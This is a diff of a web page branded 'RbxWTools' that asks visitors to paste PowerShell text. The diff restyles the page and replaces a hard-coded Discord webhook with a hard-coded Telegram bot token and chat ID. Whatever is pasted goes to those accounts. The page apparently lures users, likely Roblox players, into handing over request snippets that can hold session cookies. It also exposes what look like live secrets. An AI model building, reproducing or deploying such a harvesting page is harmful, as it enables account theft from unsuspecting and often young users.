@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RbxWTools - PowerShell URL Item Sender</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500&display=swap">
     <style>
         * {
             margin: 0;
@@ -14,35 +15,58 @@
         body {
             background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Rajdhani', sans-serif;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(99, 102, 241, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(139, 92, 246, 0.2) 0%, transparent 50%);
+            z-index: -1;
         }
 
         .container {
             width: 100%;
             max-width: 800px;
             text-align: center;
-            padding: 20px 15px;
-            margin-top: 20px;
+            padding: 30px 20px;
+            margin-top: 40px;
+        }
+
+        .header {
+            margin-bottom: 40px;
+            position: relative;
         }
 
         .neon-text {
-            font-size: 2.5rem;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3.5rem;
             font-weight: 700;
             text-transform: uppercase;
             color: transparent;
-            text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #ff00ff, 0 0 20px #ff00ff;
+            text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #ff00ff, 0 0 20px #ff00ff, 0 0 25px #ff00ff;
             margin-bottom: 10px;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
         }
 
         .domain {
+            font-family: 'Orbitron', sans-serif;
             color: #8b9dff;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
             margin-bottom: 30px;
         }
 
@@ -53,16 +77,23 @@
 
         .input-field {
             width: 100%;
-            min-height: 200px;
+            min-height: 250px;
             background: rgba(0, 0, 0, 0.7);
             border: 2px solid #6366f1;
             border-radius: 10px;
             color: #fff;
             font-family: monospace;
             font-size: 16px;
-            padding: 15px;
+            padding: 20px;
             resize: vertical;
             box-shadow: 0 0 15px rgba(99, 102, 241, 0.7);
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #8b5cf6;
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.8);
         }
 
         .input-placeholder {
@@ -71,11 +102,13 @@
             left: 50%;
             transform: translate(-50%, -50%);
             color: rgba(255, 255, 255, 0.4);
-            font-size: 18px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
             pointer-events: none;
             text-align: center;
             width: 100%;
             text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            transition: opacity 0.3s ease;
         }
 
         .input-field:focus + .input-placeholder,
@@ -88,15 +121,29 @@
             color: white;
             border: none;
             padding: 15px 40px;
-            font-size: 1.1rem;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
             border-radius: 50px;
             cursor: pointer;
+            transition: all 0.3s ease;
             box-shadow: 0 0 15px rgba(139, 92, 246, 0.7);
-            margin-bottom: 20px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .btn-ready:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 25px rgba(139, 92, 246, 0.9);
+        }
+
+        .btn-ready:active {
+            transform: translateY(1px);
         }
 
         .status {
+            margin-top: 20px;
             min-height: 24px;
+            font-family: 'Rajdhani', sans-serif;
             font-weight: 500;
         }
 
@@ -108,6 +155,20 @@
             color: #f87171;
         }
 
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #6366f1;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         footer {
             margin-top: auto;
             padding: 20px;
@@ -116,25 +177,27 @@
             color: rgba(255, 255, 255, 0.6);
         }
 
-        @media (max-width: 480px) {
+        @media (max-width: 768px) {
             .neon-text {
-                font-size: 1.8rem;
+                font-size: 2.5rem;
             }
             
             .input-field {
-                min-height: 150px;
+                min-height: 200px;
             }
             
             .input-placeholder {
-                font-size: 16px;
+                font-size: 18px;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="neon-text">RbxWTools</h1>
-        <div class="domain" id="domainDisplay">rbxwtools.site</div>
+        <div class="header">
+            <h1 class="neon-text">RbxWTools</h1>
+            <div class="domain">rbxwtools.site</div>
+        </div>
         
         <div class="input-container">
             <textarea class="input-field" placeholder=" " id="userInput"></textarea>
@@ -147,7 +210,7 @@
     </div>
     
     <footer>
-        RbxWTools &copy; 2023 | Hosted on GitHub Pages
+        RbxWTools &copy; 2023 | Powered by Namecheap
     </footer>
 
     <script>
@@ -155,61 +218,52 @@
             const userInput = document.getElementById('userInput');
             const readyBtn = document.getElementById('readyBtn');
             const status = document.getElementById('status');
-            const domainDisplay = document.getElementById('domainDisplay');
-            
-            // Показываем текущий домен
-            domainDisplay.textContent = window.location.hostname;
             
             readyBtn.addEventListener('click', function() {
                 const text = userInput.value.trim();
                 
                 if (!text) {
-                    showStatus('Please, past your PowerShell', 'error');
+                    showStatus('Please enter some text before submitting', 'error');
                     return;
                 }
                 
-                showStatus('Loading...', 'loading');
+                showStatus('Sending to Telegram...', 'loading');
                 
-                // ЗАМЕНИТЕ НА ВАШ DISCORD WEBHOOK URL
-                const webhookURL = 'https://discord.com/api/webhooks/1411718515639062538/_LqHhtFAdBl8LB1M73C5T00ypFv28w2nxFYIXgPDGsfcDw7zA2nadasuI7jVeCp8mdwe';
+                // ЗАМЕНИТЕ НА ВАШ ТОКЕН ТЕЛЕГРАМ БОТА И CHAT ID
+                const BOT_TOKEN = '8473082734:AAF2dWLlkxu0Ax3K5naojY1ZJdut0NF9vec';
+                const CHAT_ID = '8093859683';
                 
-                sendToDiscord(text, webhookURL);
+                sendToTelegram(text, BOT_TOKEN, CHAT_ID);
             });
             
-            function sendToDiscord(content, webhookURL) {
+            function sendToTelegram(message, botToken, chatId) {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
                 const payload = {
-                    content: "New PowerShell Item Received:",
-                    embeds: [
-                        {
-                            title: "Item Content",
-                            description: "```powershell\n" + content + "\n```",
-                            color: 0x6366F1,
-                            timestamp: new Date().toISOString(),
-                            footer: {
-                                text: "RbxWTools Item Sender"
-                            }
-                        }
-                    ]
+                    chat_id: chatId,
+                    text: "🔔 Новое сообщение с RbxWTools:\n\n```\n" + message + "\n```",
+                    parse_mode: "Markdown"
                 };
                 
-                fetch(webhookURL, {
+                fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(payload),
                 })
-                .then(response => {
-                    if (response.ok) {
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
                         showStatus('Success! Thank you very much.', 'success');
                         userInput.value = '';
                     } else {
-                        showStatus('Error, please reply powershell', 'error');
+                        showStatus('Error: Failed to send to Telegram. ' + data.description, 'error');
                     }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    showStatus('Internet error', 'error');
+                    showStatus('Network error. Please check your connection and try again.', 'error');
                 });
             }
             
@@ -218,7 +272,14 @@
                 status.className = 'status';
                 
                 if (type === 'loading') {
-                    status.innerHTML = '<div style="display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#6366f1;animation:spin 1s linear infinite;margin-right:10px;"></div> ' + message;
+                    const spinner = document.createElement('div');
+                    spinner.className = 'loading';
+                    status.appendChild(spinner);
+                    
+                    const text = document.createElement('span');
+                    text.textContent = ' ' + message;
+                    text.style.marginLeft = '10px';
+                    status.appendChild(text);
                 } else {
                     status.textContent = message;
                     status.classList.add(type);
